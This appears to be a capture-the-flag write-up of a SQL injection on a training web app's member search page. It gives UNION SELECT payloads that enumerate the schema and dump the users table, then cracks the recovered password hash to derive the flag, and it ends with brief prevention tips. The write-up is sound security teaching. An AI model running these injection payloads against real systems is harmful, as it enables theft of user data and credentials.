## Where to Locate:

On the http://$IP/?page=memeber we find an input field to search for users

If we enter "0 or 1=1" into the input field and submit, we observe that the process is vulnerable to a sql injection

## Exploit:

Knowing this we can begin by searching for the table name that the query searchs.

We can do this by entering the command ```1 and 1=2 union select 1,concat(table_name) from information_schema.tables where table_schema = database()```

This returns the table name=users

Following which we can search for the column names associated with the users table by entering the following command
```1 and 1=2 union select 1,concat(column_name) from information_schema.columns where table_schema = database()```

Which will return the following column names (user_id, first_name, last_name, town, country, planet, Commentaire, countersign)

We can now use all this information to obtain all the details of the users table and the contents of it's 
columns by entering the following command

```1 and 1=2 union select 1,concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users```

The results from this command return a number of fields of which the following is of particular interest
"5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28"

Following the instructions, we decrypt the md5 hash and obtain the word FortyTwo, we convert it to the lowercase fortytwo, and perform a sh256 encrypt and obtain the hash "10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5" which is our flag

## Prevention:

1. Input validation
2. Parametrized queries
3. Stored procedures
4. Escaping